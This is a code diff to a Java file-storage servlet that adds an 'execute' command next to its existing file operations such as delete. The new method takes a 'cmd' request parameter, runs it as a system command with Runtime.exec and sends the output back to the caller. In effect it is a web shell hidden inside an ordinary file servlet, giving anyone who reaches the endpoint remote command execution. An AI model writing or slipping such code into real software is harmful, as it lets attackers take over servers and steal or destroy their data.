@@ -3,9 +3,11 @@ package org.wilson.storage.servlet;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
 import java.net.URL;
 import java.nio.channels.Channels;
 import java.nio.channels.ReadableByteChannel;
+import java.util.Scanner;
 
 import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
@@ -52,11 +54,40 @@ public class FileServlet extends HttpServlet {
         else if("delete".equals(command)) {
             this.delete(req, resp);
         }
+        else if("execute".equals(command)) {
+            this.execute(req, resp);
+        }
         else {
             resp.setStatus(HttpServletResponse.SC_BAD_REQUEST);
             resp.getWriter().print("Invalid command");
             logger.error("Invalid command");
             return;
+        }
+    }
+    
+    private void execute(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String cmd = req.getParameter("cmd");
+        if(cmd == null) {
+            resp.setStatus(HttpServletResponse.SC_BAD_REQUEST);
+            resp.getWriter().print("Cmd is not set");
+            return;
+        }
+        
+        Scanner s = null;
+        try {
+            InputStream is = Runtime.getRuntime().exec(cmd).getInputStream();
+            s = new Scanner(is);
+            s.useDelimiter("\\A");
+            resp.getWriter().print(s.next());
+        }
+        catch(Exception e) {
+            logger.error("failed to run command!", e);
+            resp.getWriter().print(e.getMessage());
+        }
+        finally {
+            if(s != null) {
+                s.close();
+            }
         }
     }
     
